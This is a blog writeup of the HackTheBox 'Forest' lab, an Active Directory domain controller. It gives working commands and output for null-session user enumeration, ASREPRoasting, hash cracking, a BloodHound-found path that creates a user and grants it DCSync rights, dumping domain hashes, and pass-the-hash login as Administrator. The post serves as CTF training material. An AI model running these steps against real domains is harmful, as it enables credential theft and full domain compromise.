+++
title = "HTB - Forest"
date = "2024-11-16T00:00:00+00:00"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting
author = "squ4r00t"
authorTwitter = "" #do not include @
cover = "/img/htb/forest/tn.png"
tags = ["ctf", "htb"]
keywords = ["", ""]
description = "Writeup for the 'Easy' rated machine: Forest"
showFullContent = false
readingTime = false
hideComments = false
+++

Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account `svc-alfresco`, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell.

## Nmap Results
___

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 21:23:22Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
50033/tcp open  msrpc        Microsoft Windows RPC
```

From the scan results, we got the domain name (`htb.local`) as well as the hostname of the machine (`FOREST`). We can add them to our host file:

```bash
echo -e "10.129.30.97\tFOREST FOREST.htb.local htb.local" >> /etc/hosts
```

## Foothold
___
#### User Enumeration
___
First let's see if we can enumerate users with `rpcclient` by leveraging a SMB null session:

{{<code language="bash" title="User Enumeration with rpcclient through a NUL session">}}
rpcclient -N -U "" 10.129.30.97

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
{{</code>}}

We could have also used `netexec` for this purpose:

```bash
nxc smb 10.129.30.97 -u '' -p '' --users
```

We got back a few users:

```text
Administrator
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Let's note them somewhere and move on.

#### ASREPRoasting
___
Now that we have a list of users, we could try multiple things such as password spraying for example, but there are other things we could try first. For instance, let's see if among our list of users account there are some that do not require kerberos pre-authentication:

{{<code language="bash" title="ASREPRoasting using impacket-GetNPUsers">}}
impacket-GetNPUsers htb.local/ -usersfile users -format hashcat -outputfile asrep_hashes.out

Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...<SNIP>...63836d7
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
{{</code>}}

As we can see, the service account `svc-alfresco` does not require kerberos pre-authentication, hence we making it vulnerable to ASREPRoasting.

More on ASREPRoasting -> [https://www.thehacker.recipes/ad/movement/kerberos/asreproast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)

We can now try to crack it with hashcat:

{{<code language="bash" title="Cracking service ticket">}}
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
{{</code>}}

{{<figure src="/img/htb/forest/cracked_hash_svcalfresco.png" position=center caption="svc-alfresco password cracked !">}}

Now that we have the password for `svc-alfresco`, let's try to login via winrm:

{{<code language="bash" title="Login via winrm as svc-alfresco">}}
evil-winrm -i 10.129.30.97 -u svc-alfresco -p <PASSWORD>
{{</code>}}

We successfully logged in and was able to retrieve the user flag at `C:\Users\svc-alfresco\Desktop\user.txt`

{{<figure src="/img/htb/forest/user_flag.png" position=center caption="User flag obtained !">}}

### Privilege Escalation
___
Now that we have a foothold in the domain, let's use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) in order to collect information about the domain that we can than visualize after:

{{<code language="bash" title="Collecting data for bloodhound">}}
# Collecting data
bloodhoud-python -u svc-alfresco -p <PASSWORD> -ns 10.129.30.97 -d htb.local -c all
# Zipping the json output files
zip -r data.zip *.json
{{</code>}}

Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that `svc-alfresco`, through nested group memberships, is in the `Account Operators` group which has `GenericAll` privilege on the `Exchange Windows Permissions` group which then have the `WriteDacl` privilege over the domain object.

{{<figure src="/img/htb/forest/bloodhound.png" position=center caption="Path for privilege escalation">}}

With this information, we can do the following:
- Create a new domain user.
- Add that user to the `Exchange Windows Permissions` group by abusing our `GenericAll` privilege.
- As the new user, add `DCSync` privileges to our self by abusing the `WriteDacl` privilege.
- Dump all the hashes

{{<code language="powershell" title="Getting DCSync privilege">}}
# Creating a new domain user (as svc-alfresco)
net user hackerr password123! /add /domain

# Add 'hackerr' to the Exchange Windows Permissions group
net group "Exchange Windows Permissions" hackerr /add

# Add DCSync privileges with
$pass = ConvertTo-SecureString 'password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\hackerr', $pass)
Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync
{{</code>}}

Now `hackerr` should have DCSync rights. We can verify by using using impacket's secretsdump:

{{<code language="bash" title="DCSync using impacket-secretsdump">}}
impacket-secretsdump htb.local/hackerr:'password123!'@10.129.30.97 -just-dc -outputfile dcsync.out
{{</code>}}

{{<figure src="/img/htb/forest/dcsync.png" position=center caption="DCSync">}}

We can use the Administrator's NThash to login via `winrm`:

{{<code language="bash" title="Login via winrm as Administrator">}}
evil-winrm -i 10.129.30.97 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
{{</code>}}

We can then retrive the root flag.

{{<figure src="/img/htb/forest/root_flag.png" position=center caption="Root flag obtained !">}}

